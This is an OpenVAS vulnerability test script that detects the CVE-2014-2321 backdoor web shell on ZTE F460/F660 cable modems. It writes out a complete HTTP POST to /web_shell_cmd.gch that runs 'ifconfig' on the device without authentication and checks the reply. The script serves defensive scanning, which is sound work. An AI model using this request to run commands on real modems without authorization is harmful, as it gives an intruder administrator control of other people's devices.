###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zte_f460_f660_65962.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# ZTE F460/F660 Backdoor Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103924");
  script_bugtraq_id(65962);
  script_cve_id("CVE-2014-2321");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");
  script_name("ZTE F460/F660 Backdoor Unauthorized Access Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65962");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-03-20 09:52:23 +0100 (Thu, 20 Mar 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Mini_web_server/banner");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary commands with
administrator level access on the affected device. This may aid in further attacks.");
  script_tag(name:"vuldetect", value:"Try to execute the 'ifconfig' command with a HTTP GET request and check the response.");
  script_tag(name:"insight", value:"web_shell_cmd.gch on ZTE F460 and F660 cable modems allows remote
attackers to obtain administrative access via sendcmd requests");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"ZTE F460/F660 are prone to an unauthorized-access vulnerability.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

banner = get_http_banner( port:port );
if( "Server: Mini web server" >!< banner ) exit( 0 );

if( http_vuln_check( port:port, url:'/web_shell_cmd.gch',pattern:"please input shell command" ) )
{
  useragent = http_get_user_agent();
  host = http_host_name(port:port);

  req = 'POST /web_shell_cmd.gch HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Encoding: identify\r\n' +
        'Referer: http://' + host + '/web_shell_cmd.gch\r\n' +
        'Connection: Close\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: 98\r\n' +
        '\r\n' +
        'IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fsbin%2Fifconfig&CmdAck=';
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( "Link encap" >< buf && "HWaddr" >< buf && "BROADCAST" >< buf )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit(99);
